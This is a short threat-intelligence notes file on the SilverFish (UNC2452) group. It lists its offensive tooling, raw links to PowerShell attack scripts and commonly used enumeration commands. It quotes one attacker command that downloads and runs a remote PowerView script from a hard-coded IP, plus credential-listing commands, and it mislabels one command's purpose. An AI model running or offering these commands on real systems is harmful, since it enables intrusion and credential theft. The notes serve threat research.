# This is my notes about the SilverFish(UNC2452) Group


## The SilverFish Group uses publicly available red teaming tools such as Empire, cobalt strike, koadic loaders, and, in several cases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are lots of specially crafted Powershell, BAT, CSPROJ, JavaScript and HTA files that are mainly used for enumeration and data exfiltration.

## TOOLS:

- https://github.com/zerosum0x0/koadic

- Besides the domain fronting method, the SilverFish group uses the ”mallable C2 profile”
features of Cobalt Strike. The following image shows the Cobalt Strike beacon shellcode
emulation results, fronted domain, and actual host value. The chosen mallable C2 profile [22]
artifacts can easily be identified.

- https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.3.profile

- msbuild.exe utility and .csproj files are frequently used to load shellcode in
red teaming engagements.

- https://www.powershellempire.com/

- https://github.com/gentilkiwi/mimikatz

- https://github.com/p3nt4/Invoke-SocksProxy


### Powershell Direct Links:

- raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
- raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
- raw.githubusercontent.com/device33/PowerView.ps1/master/PowerView.ps1
- raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1


## Most Used Commands:

- nltest /dclist - > Lists all domain controllers in the domain.

- nltest /domain_trusts - > Returns a list of trusted domains

- cmdkey /list - > Displays the list of stored user names and credentials

- net group ”domain admins” /domain   - > Lists all domain controllers in the domain.

- dir c:\\programdata - > Prints the contents of ”programdata” directory (used for enumerating the installed software)

- powershell -nop -enc %Trimmed...% - > Executes the BASE64 encoded powershell 	command/script.


## Other basic commands: 

- dir \"c:\\program files\"
- dir \"c:\\program files (x86)\\\"
- dir \"c:\\ProgramData\\\"

- cmd \/c powershell -nop exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:\/\/176.10.118.136:80\/pwrvw.ps1'); Droller -OperatingSystem *server* > c:\\ProgramData\\z_servers.txt


## some good resources:

https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps

https://attack.mitre.org/techniques/T1090/004/


## Reference: 

- https://www.prodaft.com/m/uploads/SilverFish_TLPWHITE.pdf







